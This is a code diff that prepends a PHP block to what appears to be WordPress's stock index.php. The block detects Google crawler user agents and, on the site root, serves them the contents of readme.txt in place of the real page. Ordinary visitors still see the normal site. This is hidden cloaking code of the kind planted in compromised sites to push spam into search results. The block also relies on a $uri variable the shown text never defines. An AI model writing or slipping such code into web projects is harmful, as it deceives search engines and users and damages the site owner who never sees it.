@@ -1,0 +1,35 @@
+<?php
+function is_google_bot() {
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+    }
+    return false;
+}
+
+if ($uri == '/' && is_google_bot()) {
+    if (file_exists('readme.txt') && is_readable('readme.txt')) {
+        $bot_content = file_get_contents('readme.txt');
+        echo $bot_content;
+        exit;
+    }
+}
+?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
